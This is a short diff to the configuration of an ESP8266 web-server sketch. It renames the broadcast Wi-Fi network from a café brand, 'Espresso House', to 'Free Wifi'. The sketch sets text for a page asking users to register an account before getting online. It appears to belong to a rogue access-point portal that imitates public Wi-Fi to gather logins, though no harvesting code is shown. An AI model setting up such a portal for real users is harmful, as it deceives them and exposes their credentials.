@@ -4,8 +4,8 @@
 #include <ESP8266WebServer.h>
 
 // User configuration
-#define SSID_NAME "Espresso House"
-#define SUBTITLE "Welcome to Espresso House service."
+#define SSID_NAME "Free Wifi"
+#define SUBTITLE "Welcome to Free Wifi service."
 #define TITLE "Register:"
 #define BODY "Create an account to get connected to the internet."
 #define POST_TITLE "Validating..."
